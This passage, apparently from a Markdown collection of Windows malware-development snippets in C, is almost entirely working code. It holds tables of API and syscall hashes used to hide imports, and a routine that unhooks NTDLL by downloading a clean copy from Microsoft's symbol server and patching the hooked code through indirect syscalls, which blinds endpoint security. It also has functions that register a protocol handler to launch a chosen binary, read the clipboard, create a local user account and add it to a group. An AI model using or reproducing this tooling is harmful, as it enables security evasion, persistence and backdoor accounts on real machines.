#define ZwFreeVirtualMemory_DJB2         0x5B99D958
#define ZwProtectVirtualMemory_DJB2      0x5B63D1D7
#define ZwCreateSection_DJB2     0x2947F2BF
#define ZwOpenSection_DJB2       0x631E2D7D
#define ZwMapViewOfSection_DJB2  0x04B658F9
#define ZwUnmapViewOfSection_DJB2        0xFDB573FC
#define ZwCreateFile_DJB2        0xF1246D2A
#define ZwOpenFile_DJB2  0x509070A8
#define ZwReadFile_DJB2  0xBC8BBB72
#define ZwWriteFile_DJB2         0x230B5921
#define ZwClose_DJB2     0x2E48662C
#define ZwWaitForSingleObject_DJB2       0x7D7F0F6B
#define ZwDelayExecution_DJB2    0x869D1819
#define ZwReadVirtualMemory_DJB2         0xD6BF9452
#define ZwWriteVirtualMemory_DJB2        0x3A5906E1
#define ZwFlushInstructionCache_DJB2     0x3AA08BCE
#define ZwQuerySystemInformation_DJB2    0xF9E1E277
#define ZwQueryInformationProcess_DJB2   0x4E154511
#define ZwQueryVirtualMemory_DJB2        0x8802EDAC
#define ZwQueueApcThread_DJB2    0x50B53207
#define ZwOpenProcess_DJB2       0x9B524A87
#define ZwOpenThread_DJB2        0xD708B220
#define ZwCreateProcess_DJB2     0x617C0FC9
#define ZwCreateProcessEx_DJB2   0xB0BF2F66
#define ZwCreateUserProcess_DJB2         0x740D76C8
#define ZwCreateThread_DJB2      0xEC8DD722
#define ZwCreateThreadEx_DJB2    0x476030FF
#define ZwSuspendThread_DJB2     0xAA188F50
#define ZwResumeThread_DJB2      0xE19B0D3F
#define ZwGetContextThread_DJB2  0x7FA559D3
#define ZwSetContextThread_DJB2  0x1223205F
#define ZwTerminateThread_DJB2   0xB312A777
#define ZwTerminateProcess_DJB2  0xF89AEABE
```
### Generic String Hashing Syscalls Hash Values (Zw)
```c
#define ZwAllocateVirtualMemory_GEN      0x0109C089
#define ZwFreeVirtualMemory_GEN  0x526FE939
#define ZwProtectVirtualMemory_GEN       0x5A5F1B39
#define ZwCreateSection_GEN      0x0CCEBC4E
#define ZwOpenSection_GEN        0x5883CBFE
#define ZwMapViewOfSection_GEN   0x0C55234E
#define ZwUnmapViewOfSection_GEN         0x097CC55E
#define ZwCreateFile_GEN         0x01429965
#define ZwOpenFile_GEN   0x66C4DBB5
#define ZwReadFile_GEN   0x04812455
#define ZwWriteFile_GEN  0x0F370F45
#define ZwClose_GEN      0x01BA36F5
#define ZwWaitForSingleObject_GEN        0x7445A624
#define ZwDelayExecution_GEN     0x477D66EE
#define ZwReadVirtualMemory_GEN  0x0DFB45F9
#define ZwWriteVirtualMemory_GEN         0x022A7ED9
#define ZwFlushInstructionCache_GEN      0x01BF7B95
#define ZwQuerySystemInformation_GEN     0x0C21945E
#define ZwQueryInformationProcess_GEN    0x08AC03F3
#define ZwQueryVirtualMemory_GEN         0x0DB752E9
#define ZwQueueApcThread_GEN     0x0C9DFF64
#define ZwOpenProcess_GEN        0x56ACFF03
#define ZwOpenThread_GEN         0x3A43E2B4
#define ZwCreateProcess_GEN      0x030188B3
#define ZwCreateProcessEx_GEN    0x0188B4C8
#define ZwCreateUserProcess_GEN  0x63A37433
#define ZwCreateThread_GEN       0x01F8CA34
#define ZwCreateThreadEx_GEN     0x0735C638
#define ZwSuspendThread_GEN      0x73657FF4
#define ZwResumeThread_GEN       0x292325A4
#define ZwGetContextThread_GEN   0x06FEFB14
#define ZwSetContextThread_GEN   0x06F9BB14
#define ZwTerminateThread_GEN    0x030F0914
#define ZwTerminateProcess_GEN   0x0D7DBA93
```
### Lose-Lose Syscalls Hash Values (Nt)
```c
#define NtAllocateVirtualMemory_LOSE     0x00000947
#define NtFreeVirtualMemory_LOSE         0x000007A4
#define NtProtectVirtualMemory_LOSE      0x00000903
#define NtCreateSection_LOSE     0x000005EB
#define NtOpenSection_LOSE       0x00000529
#define NtMapViewOfSection_LOSE  0x00000705
#define NtUnmapViewOfSection_LOSE        0x000007E8
#define NtCreateFile_LOSE        0x00000496
#define NtOpenFile_LOSE  0x000003D4
#define NtReadFile_LOSE  0x000003BE
#define NtWriteFile_LOSE         0x0000044D
#define NtClose_LOSE     0x000002B8
#define NtWaitForSingleObject_LOSE       0x00000837
#define NtDelayExecution_LOSE    0x00000665
#define NtReadVirtualMemory_LOSE         0x0000079E
#define NtWriteVirtualMemory_LOSE        0x0000082D
#define NtFlushInstructionCache_LOSE     0x0000093A
#define NtQuerySystemInformation_LOSE    0x000009E3
#define NtQueryInformationProcess_LOSE   0x00000A3D
#define NtQueryVirtualMemory_LOSE        0x00000838
#define NtQueueApcThread_LOSE    0x00000633
#define NtOpenProcess_LOSE       0x00000533
#define NtOpenThread_LOSE        0x000004AC
#define NtCreateProcess_LOSE     0x000005F5
#define NtCreateProcessEx_LOSE   0x000006B2
#define NtCreateUserProcess_LOSE         0x00000794
#define NtCreateThread_LOSE      0x0000056E
#define NtCreateThreadEx_LOSE    0x0000062B
#define NtSuspendThread_LOSE     0x000005FC
#define NtResumeThread_LOSE      0x0000058B
#define NtGetContextThread_LOSE  0x0000071F
#define NtSetContextThread_LOSE  0x0000072B
#define NtTerminateThread_LOSE   0x000006C3
#define NtTerminateProcess_LOSE  0x0000074A
```
### Cyclic Redundancy Check (CRC) Syscalls Hash Values (Zw)
```c
#define ZwAllocateVirtualMemory_CRC      0x71D7EF35
#define ZwFreeVirtualMemory_CRC  0xD7D979CC
#define ZwProtectVirtualMemory_CRC       0x998153D9
#define ZwCreateSection_CRC      0x4A23A81B
#define ZwOpenSection_CRC        0x7FA5108C
#define ZwMapViewOfSection_CRC   0xC5D6775B
#define ZwUnmapViewOfSection_CRC         0x8E77C229
#define ZwCreateFile_CRC         0x06ECB81F
#define ZwOpenFile_CRC   0x1AB98307
#define ZwReadFile_CRC   0x19C04E23
#define ZwWriteFile_CRC  0xE84D69F9
#define ZwClose_CRC      0x1BDA0FB8
#define ZwWaitForSingleObject_CRC        0xCB27B639
#define ZwDelayExecution_CRC     0x92A1E557
#define ZwReadVirtualMemory_CRC  0xBF2D8580
#define ZwWriteVirtualMemory_CRC         0xFAB864E6
#define ZwFlushInstructionCache_CRC      0x141EEF42
#define ZwQuerySystemInformation_CRC     0xF6077D8B
#define ZwQueryInformationProcess_CRC    0x211BF7D0
#define ZwQueryVirtualMemory_CRC         0x1DC90E53
#define ZwQueueApcThread_CRC     0x445284BF
#define ZwOpenProcess_CRC        0xD4CB72F5
#define ZwOpenThread_CRC         0x8FA81930
#define ZwCreateProcess_CRC      0xE14DCA62
#define ZwCreateProcessEx_CRC    0xBE739377
#define ZwCreateUserProcess_CRC  0x3BA514B5
#define ZwCreateThread_CRC       0xBCB87418
#define ZwCreateThreadEx_CRC     0x477AC175
#define ZwSuspendThread_CRC      0x65575599
#define ZwResumeThread_CRC       0x14A0CC11
#define ZwGetContextThread_CRC   0xB2930066
#define ZwSetContextThread_CRC   0x8085727F
#define ZwTerminateThread_CRC    0xCCD77E04
#define ZwTerminateProcess_CRC   0xF53CF927
```
### Jenkins One-at-a-Time WinAPIs Hash Values
```c
#define VirtualAlloc_JENK        0xE328E7C0
#define VirtualAllocEx_JENK      0x0ECFC793
#define VirtualProtect_JENK      0x69B260D2
#define VirtualProtectEx_JENK    0x84A3F2CE
#define VirtualFree_JENK         0xF9900D26
#define VirtualFreeEx_JENK       0xAB71B86B
#define CreateThread_JENK        0x8A619248
#define CreateRemoteThread_JENK  0xA68DBF19
#define CreateRemoteThreadEx_JENK        0xFA394F9B
#define CreateFileW_JENK         0x9A3D82E5
#define CreateFileA_JENK         0x68211ED1
#define GetFileSize_JENK         0xB11F1D63
#define SetFileInformationByHandle_JENK  0xBBA460F6
#define MapViewOfFile_JENK       0xE30C5ED2
#define MapViewOfFile2_JENK      0x4068F3F4
#define UnmapViewOfFile_JENK     0xB2064993
#define UnmapViewOfFile2_JENK    0x5A937EA6
#define CreateProcessW_JENK      0xD460721B
#define CreateProcessA_JENK      0x261E1591
#define WaitForSingleObject_JENK         0x000DEA0A
#define WaitForSingleObjectEx_JENK       0xE87395C4
#define WriteProcessMemory_JENK  0x184EC554
#define ReadProcessMemory_JENK   0xA5F9E9C4
#define VirtualQuery_JENK        0x5FBBF0B3
#define VirtualQueryEx_JENK      0xD03B74B4
#define WriteFile_JENK   0x8CFB9E0E
#define ReadFile_JENK    0x62BF1D54
#define QueueUserAPC_JENK        0x6290759E
#define CloseHandle_JENK         0x8FA1D581
#define OpenProcess_JENK         0xA650376B
#define OpenThread_JENK  0x827D4ECB
#define LoadLibraryA_JENK        0xEC33D795
#define LoadLibraryW_JENK        0xFA3EF39F
#define AddVectoredExceptionHandler_JENK         0xE42C12F5
#define RemoveVectoredExceptionHandler_JENK      0x61C9C296
#define ResumeThread_JENK        0xDF485CF4
#define SuspendThread_JENK       0xCAA6188D
#define GetThreadContext_JENK    0x98DFF5FA
#define SetThreadContext_JENK    0x411990F7
#define TerminateThread_JENK     0x2A4D2DDA
#define TerminateProcess_JENK    0x66AFA02A
```
### NTDLL Unhooking From The Web
```c
#include <windows.h>
#include <stdio.h>
#include <Wininet.h>
#pragma comment (lib, "Wininet.lib")

#include "Structs.h"
#include "HellsHall.h"

#define NtProtectVirtualMemory_CRC32		0x17C9087B

// -------------------------------- //// -------------------------------- //// -------------------------------- //

typedef struct _NTAPI_FUNC
{
	NT_SYSCALL	NtProtectVirtualMemory;

} NTAPI_FUNC, * PNTAPI_FUNC;

NTAPI_FUNC g_NTAPI = { 0 };

// -------------------------------- //// -------------------------------- //// -------------------------------- //

BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_NTAPI.NtProtectVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
		return FALSE;
	}

	return TRUE;
}

BOOL FetchFileFromURLW(IN LPCWSTR szFileDownloadUrl, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {


	HINTERNET	hInternet			= NULL,
				hInternetFile		= NULL;

	PBYTE 		pTmpPntr			= NULL,
				pFileBuffer			= NULL;
	DWORD		dwTmpBytesRead		= 0x00,
				dwFileSize			= 0x00;

	if (!ppFileBuffer || !pdwFileSize)
		return FALSE;

	if (!(hInternet = InternetOpenW(NULL, 0x00, NULL, NULL, 0x00))) {
		printf("[!] InternetOpenW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(hInternetFile = InternetOpenUrlW(hInternet, szFileDownloadUrl, NULL, 0x00, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0x00))) {
		printf("[!] InternetOpenUrlW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pTmpPntr = LocalAlloc(LPTR, 1024))) {
		printf("[!] LocalAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpPntr, 1024, &dwTmpBytesRead)) {
			printf("[!] InternetReadFile Failed With Error: %d \n", GetLastError());
			goto _END_OF_FUNC;
		}

		dwFileSize += dwTmpBytesRead;

		if (!pFileBuffer)
			pFileBuffer = LocalAlloc(LPTR, dwTmpBytesRead);
		else
			pFileBuffer = LocalReAlloc(pFileBuffer, dwFileSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (!pFileBuffer) {
			printf("[!] LocalAlloc/LocalReAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
			goto _END_OF_FUNC;
		}

		memcpy(pFileBuffer + (dwFileSize - dwTmpBytesRead), pTmpPntr, dwTmpBytesRead);
		memset(pTmpPntr, 0x00, dwTmpBytesRead);

		if (dwTmpBytesRead < 1024)
			break;
	}

	*ppFileBuffer	= pFileBuffer;
	*pdwFileSize	= dwFileSize;

_END_OF_FUNC:
	if (pTmpPntr)
		LocalFree(pTmpPntr);
	if ((!*ppFileBuffer || !*pdwFileSize) && pFileBuffer)
		LocalFree(pFileBuffer);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	return (*ppFileBuffer != NULL && *pdwFileSize != 0x00) ? TRUE : FALSE;
}


DWORD RvaToFileOffset(IN DWORD dwRVA, IN PBYTE pBaseAddress) {

	PIMAGE_NT_HEADERS        pImgNtHdrs			= NULL;
	PIMAGE_SECTION_HEADER    pImgSectionHdr		= NULL;

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBaseAddress + ((PIMAGE_DOS_HEADER)pBaseAddress)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return 0x00;

	pImgSectionHdr = (PIMAGE_SECTION_HEADER)((PBYTE)&pImgNtHdrs->OptionalHeader + pImgNtHdrs->FileHeader.SizeOfOptionalHeader);

	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
		if (dwRVA >= pImgSectionHdr[i].VirtualAddress && dwRVA < (pImgSectionHdr[i].VirtualAddress + pImgSectionHdr[i].Misc.VirtualSize))
			return (dwRVA - pImgSectionHdr[i].VirtualAddress) + pImgSectionHdr[i].PointerToRawData;
	}

	printf("[!] Cound'nt Convert The 0x%0.8X RVA to File Offset! \n", dwRVA);
	return 0x00;
}


BOOL UnhookNtdllFromWeb(IN HMODULE uHookedNtdllModule) {

	if (!uHookedNtdllModule)
		return FALSE;

	NTSTATUS				STATUS								= 0x00;
	WCHAR					szNtdllPath[MAX_PATH * 2]			= { 0 };
	DWORD					dwNtdllFileSize						= 0x00;
	PVOID					pBaseAddress						= NULL,
							pHookedNtdllText					= NULL,
							pNewNtdllTxt						= NULL;
	SIZE_T					sNtdllTxtLength						= NULL,
							sNtdllTxtLength2					= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs							= { 0 };
	PIMAGE_SECTION_HEADER	pImgSecHdr							= { 0 };
	DWORD					dwOldProtection						= 0x00;
	BOOL					bResult								= FALSE;

	if (!InitializeNtSyscalls())
		return FALSE;

	pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)uHookedNtdllModule + ((PIMAGE_DOS_HEADER)uHookedNtdllModule)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	wsprintfW(szNtdllPath, L"https://msdl.microsoft.com/download/symbols/ntdll.dll/%0.8X%0.4X/ntdll.dll", pImgNtHdrs->FileHeader.TimeDateStamp, pImgNtHdrs->OptionalHeader.SizeOfImage);

	if (!FetchFileFromURLW(szNtdllPath, &pBaseAddress, &dwNtdllFileSize)) {
		goto _END_OF_FUNC;
	}

	pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		if ((*(ULONG*)pImgSecHdr[i].Name | 0x20202020) == 'xet.') {

			pHookedNtdllText	= (PVOID)((ULONG_PTR)uHookedNtdllModule + pImgSecHdr[i].VirtualAddress);
			pNewNtdllTxt		= (PVOID)((ULONG_PTR)pBaseAddress + RvaToFileOffset(pImgSecHdr[i].VirtualAddress, pBaseAddress));
			sNtdllTxtLength		= sNtdllTxtLength2 = (SIZE_T)pImgSecHdr[i].Misc.VirtualSize;
			break;
		}
	}

	if (!pHookedNtdllText || !pNewNtdllTxt || !sNtdllTxtLength)
		goto _END_OF_FUNC;

	if (*(ULONG*)pHookedNtdllText != *(ULONG*)pNewNtdllTxt) {
		printf("[!] Failed To Fetch A Valid Unhooked Text Section: %d\n", __LINE__);
		goto _END_OF_FUNC;
	}

	SET_SYSCALL(g_NTAPI.NtProtectVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(NtCurrentProcess(), &pHookedNtdllText, &sNtdllTxtLength, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	memcpy(pHookedNtdllText, pNewNtdllTxt, sNtdllTxtLength2);

	SET_SYSCALL(g_NTAPI.NtProtectVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(NtCurrentProcess(), &pHookedNtdllText, &sNtdllTxtLength, dwOldProtection, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}


	bResult = TRUE;

_END_OF_FUNC:
	if (pBaseAddress)
		LocalFree(pBaseAddress);
	return bResult;
}
```
### Djb2 WinAPIs Hash Values
```c
#define VirtualAlloc_DJB2        0x382C0F97
#define VirtualAllocEx_DJB2      0xF36E5AB4
#define VirtualProtect_DJB2      0x844FF18D
#define VirtualProtectEx_DJB2    0xD812922A
#define VirtualFree_DJB2         0x668FCF2E
#define VirtualFreeEx_DJB2       0x49C05C0B
#define CreateThread_DJB2        0x7F08F451
#define CreateRemoteThread_DJB2  0xAA30775D
#define CreateRemoteThreadEx_DJB2        0xF82BCBFA
#define CreateFileW_DJB2         0xEB96C610
#define CreateFileA_DJB2         0xEB96C5FA
#define GetFileSize_DJB2         0x7891C520
#define SetFileInformationByHandle_DJB2  0xFAA144FE
#define MapViewOfFile_DJB2       0x11DEB0B3
#define MapViewOfFile2_DJB2      0x4DB4C745
#define UnmapViewOfFile_DJB2     0xD639F256
#define UnmapViewOfFile2_DJB2    0x9D783D48
#define CreateProcessW_DJB2      0xAEB52E2F
#define CreateProcessA_DJB2      0xAEB52E19
#define WaitForSingleObject_DJB2         0xECCDA1BA
#define WaitForSingleObjectEx_DJB2       0x56BD0197
#define WriteProcessMemory_DJB2  0x6F22E8C8
#define ReadProcessMemory_DJB2   0xB8932459
#define VirtualQuery_DJB2        0x395269C2
#define VirtualQueryEx_DJB2      0xD793EB9F
#define WriteFile_DJB2   0x663CECB0
#define ReadFile_DJB2    0x71019921
#define QueueUserAPC_DJB2        0x76C0C4BD
#define CloseHandle_DJB2         0x3870CA07
#define OpenProcess_DJB2         0x7136FDD6
#define OpenThread_DJB2  0x806CB78F
#define LoadLibraryA_DJB2        0x5FBFF0FB
#define LoadLibraryW_DJB2        0x5FBFF111
#define AddVectoredExceptionHandler_DJB2         0x37D1F0D7
#define RemoveVectoredExceptionHandler_DJB2      0xC88FFB7C
#define ResumeThread_DJB2        0x74162A6E
#define SuspendThread_DJB2       0x8BF7525F
#define GetThreadContext_DJB2    0xEBA2CFC2
#define SetThreadContext_DJB2    0x7E20964E
#define TerminateThread_DJB2     0x87AE6A46
#define TerminateProcess_DJB2    0x60AF076D
```
### Generic String WinAPIs Hash Values 
```c
#define VirtualAlloc_GEN         0x0CD6C713
#define VirtualAllocEx_GEN       0x0938EBE8
#define VirtualProtect_GEN       0x08DD1794
#define VirtualProtectEx_GEN     0x02E860E8
#define VirtualFree_GEN  0x04CDD1F5
#define VirtualFreeEx_GEN        0x322E0208
#define CreateThread_GEN         0x0108CC24
#define CreateRemoteThread_GEN   0x0472FA84
#define CreateRemoteThreadEx_GEN         0x02FA8CB8
#define CreateFileW_GEN  0x052696D7
#define CreateFileA_GEN  0x052696E1
#define GetFileSize_GEN  0x0F97B825
#define SetFileInformationByHandle_GEN   0x0776B975
#define MapViewOfFile_GEN        0x06DF1045
#define MapViewOfFile2_GEN       0x0DF104E2
#define UnmapViewOfFile_GEN      0x6920A2B5
#define UnmapViewOfFile2_GEN     0x6DF5D412
#define CreateProcessW_GEN       0x1FE16467
#define CreateProcessA_GEN       0x1FE16491
#define WaitForSingleObject_GEN  0x02B5D4B4
#define WaitForSingleObjectEx_GEN        0x4A2B4578
#define WriteProcessMemory_GEN   0x0B46B069
#define ReadProcessMemory_GEN    0x2FD8DD49
#define VirtualQuery_GEN         0x0CC828D9
#define VirtualQueryEx_GEN       0x07D721F8
#define WriteFile_GEN    0x0F566245
#define ReadFile_GEN     0x748734A5
#define QueueUserAPC_GEN         0x06185213
#define CloseHandle_GEN  0x665E72B5
#define OpenProcess_GEN  0x37E3FF63
#define OpenThread_GEN   0x3C5512B4
#define LoadLibraryA_GEN         0x2AADFF01
#define LoadLibraryW_GEN         0x2AADFF37
#define AddVectoredExceptionHandler_GEN  0x0C923BB2
#define RemoveVectoredExceptionHandler_GEN       0x04FEA5D2
#define ResumeThread_GEN         0x3FD327B4
#define SuspendThread_GEN        0x1C651894
#define GetThreadContext_GEN     0x12993714
#define SetThreadContext_GEN     0x12987714
#define TerminateThread_GEN      0x631F99E4
#define TerminateProcess_GEN     0x0C94B593
```
### Register Custom Protocol Handler (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL RegisterProtocolHandlerA(IN LPCSTR cProtocolHandler, IN LPCSTR cBinaryAndArguments) {

    BOOL            bResult                             = FALSE;
    LSTATUS         STATUS                              = ERROR_SUCCESS;
    HKEY            hKey                                = NULL;
    CHAR            cUrlValue[MAX_PATH]                = { 0 };
    CHAR            cSubKeyPath[MAX_PATH]              = { 0 };
    CHAR            cCommandKeyPath[MAX_PATH * 2]      = { 0 };

    if (!cProtocolHandler || !cBinaryAndArguments)
        return FALSE;

    sprintf_s(cUrlValue, MAX_PATH, "URL:%s", cProtocolHandler);
    sprintf_s(cSubKeyPath, MAX_PATH, "Software\\Classes\\%s", cProtocolHandler);
    sprintf_s(cCommandKeyPath, MAX_PATH * 2, "%s\\shell\\open\\command", cSubKeyPath);

    if ((STATUS = RegCreateKeyExA(HKEY_CURRENT_USER, cSubKeyPath, 0x00, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL)) != ERROR_SUCCESS) {
        printf("[!] RegCreateKeyExA [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueExA(hKey, NULL, 0x00, REG_SZ, (const BYTE*)cUrlValue, strlen(cUrlValue) + sizeof(CHAR))) != ERROR_SUCCESS) {
        printf("[!] RegSetValueExA [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    RegCloseKey(hKey);

    if ((STATUS = RegCreateKeyExA(HKEY_CURRENT_USER, cSubKeyPath, 0x00, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL)) != ERROR_SUCCESS) {
        printf("[!] RegCreateKeyExA [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueExA(hKey, "URL Protocol", 0x00, REG_SZ, (const BYTE*)"", sizeof(""))) != ERROR_SUCCESS) {
        printf("[!] RegSetValueExA [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    RegCloseKey(hKey);

    if ((STATUS = RegCreateKeyExA(HKEY_CURRENT_USER, cCommandKeyPath, 0x00, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL)) != ERROR_SUCCESS) {
        printf("[!] RegCreateKeyExA [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueExA(hKey, NULL, 0x00, REG_SZ, (const BYTE*)cBinaryAndArguments, strlen(cBinaryAndArguments) + sizeof(CHAR))) != ERROR_SUCCESS) {
        printf("[!] RegSetValueExA [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hKey != NULL)
        RegCloseKey(hKey);
    return bResult;
}
```
### Register Custom Protocol Handler (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL RegisterProtocolHandlerW(IN LPCWSTR szProtocolHandler, IN LPCWSTR szBinaryAndArguments) {

    BOOL            bResult                             = FALSE;
    LSTATUS         STATUS                              = ERROR_SUCCESS;
    HKEY            hKey                                = NULL;
    WCHAR           szUrlValue[MAX_PATH]                = { 0 };
    WCHAR           szSubKeyPath[MAX_PATH]              = { 0 };
    WCHAR           szCommandKeyPath[MAX_PATH * 2]      = { 0 };

    if (!szProtocolHandler || !szBinaryAndArguments)
        return FALSE;

    swprintf_s(szUrlValue, MAX_PATH, L"URL:%s", szProtocolHandler);
    swprintf_s(szSubKeyPath, MAX_PATH,  L"Software\\Classes\\%s", szProtocolHandler);
    swprintf_s(szCommandKeyPath, MAX_PATH * 2, L"%s\\shell\\open\\command", szSubKeyPath);

    if ((STATUS = RegCreateKeyExW(HKEY_CURRENT_USER, szSubKeyPath, 0x00, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL)) != ERROR_SUCCESS) {
        printf("[!] RegCreateKeyExW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueExW(hKey, NULL, 0x00, REG_SZ, (const BYTE*)szUrlValue, (wcslen(szUrlValue) + sizeof(WCHAR)) * sizeof(WCHAR))) != ERROR_SUCCESS) {
        printf("[!] RegSetValueExW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    RegCloseKey(hKey);

    if ((STATUS = RegCreateKeyExW(HKEY_CURRENT_USER, szSubKeyPath, 0x00, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL)) != ERROR_SUCCESS) {
        printf("[!] RegCreateKeyExW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueExW(hKey, L"URL Protocol", 0x00, REG_SZ, (const BYTE*)L"", sizeof(L""))) != ERROR_SUCCESS) {
        printf("[!] RegSetValueExW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    RegCloseKey(hKey);

    if ((STATUS = RegCreateKeyExW(HKEY_CURRENT_USER, szCommandKeyPath, 0x00, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL)) != ERROR_SUCCESS) {
        printf("[!] RegCreateKeyExW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueExW(hKey, NULL, 0x00, REG_SZ, (const BYTE*)szBinaryAndArguments, (wcslen(szBinaryAndArguments) + sizeof(WCHAR)) * sizeof(WCHAR))) != ERROR_SUCCESS) {
        printf("[!] RegSetValueExW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hKey != NULL)
        RegCloseKey(hKey);
    return bResult;
}
```

### Read Clipboard Data
```c
#include <windows.h>
#include <stdio.h>
BOOL ReadClipBoardData(OUT LPSTR* lpClipboardData) {

    BOOL    bResult             = FALSE;
    HANDLE  hClipBoardData      = NULL;
    LPSTR   lpTmpClipBoardData  = NULL;

    if (!OpenClipboard(NULL)) {
        printf("[!] OpenClipboard Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    if ((hClipBoardData = GetClipboardData(CF_TEXT)) == NULL) {
        printf("[!] GetClipboardData Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if ((lpTmpClipBoardData = (LPSTR)GlobalLock(hClipBoardData)) == NULL) {
        printf("[!] GlobalLock Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(*lpClipboardData = (LPSTR)LocalAlloc(LPTR, strlen(lpTmpClipBoardData) + sizeof(CHAR)))) {
        printf("[!] LocalAlloc Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    strcpy_s(*lpClipboardData, strlen(lpTmpClipBoardData) + sizeof(CHAR), lpTmpClipBoardData);

    bResult = TRUE;

_END_OF_FUNC:
    if (hClipBoardData)
        GlobalUnlock(hClipBoardData);
    CloseClipboard();
    return bResult;
}
```
### Create Local User Account
```c
#include <windows.h>
#include <stdio.h>
#include <LM.h>

#pragma comment(lib, "Netapi32.lib")

BOOL CreateUserAccount(IN LPWSTR szUserName, IN LPWSTR szPassword) {

    USER_INFO_1     UserInfo    = { 0 };
    NET_API_STATUS  NetStatus   = 0x00;

    UserInfo.usri1_name         = szUserName;
    UserInfo.usri1_password     = szPassword;
    UserInfo.usri1_priv         = USER_PRIV_USER;
    UserInfo.usri1_home_dir     = NULL;
    UserInfo.usri1_comment      = NULL;
    UserInfo.usri1_flags        = UF_SCRIPT;
    UserInfo.usri1_script_path  = NULL;

    if ((NetStatus = NetUserAdd(NULL, 0x01, (LPBYTE)&UserInfo, NULL)) != NERR_Success) {
        printf("[!] NetUserAdd Failed With Error: 0x%0.8X\n", NetStatus);
        return FALSE;
    }

    return TRUE;
}
```
### Add User To Local Group
```c
#include <LM.h>

#pragma comment(lib, "Netapi32.lib")

BOOL AddUserToGroup(IN LPCWSTR szUserName, IN LPCWSTR szGroupName) {

    LOCALGROUP_MEMBERS_INFO_3   LocalGrpMemInfo     = { 0 };
    NET_API_STATUS              NetSTATUS           = NERR_Success;

    LocalGrpMemInfo.lgrmi3_domainandname = (LPWSTR)szUserName;

    if ((NetSTATUS = NetLocalGroupAddMembers(NULL, (LPWSTR)szGroupName, 0x03, (LPBYTE)&LocalGrpMemInfo, 0x01)) != NERR_Success) {
        printf("[!] NetLocalGroupAddMembers Failed With Error: 0x%0.8X\n", NetSTATUS);
        return FALSE;
    }

    return TRUE;
}
```
### ICMP Echo
```c
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <stdio.h>

#pragma comment(lib, "iphlpapi.lib")
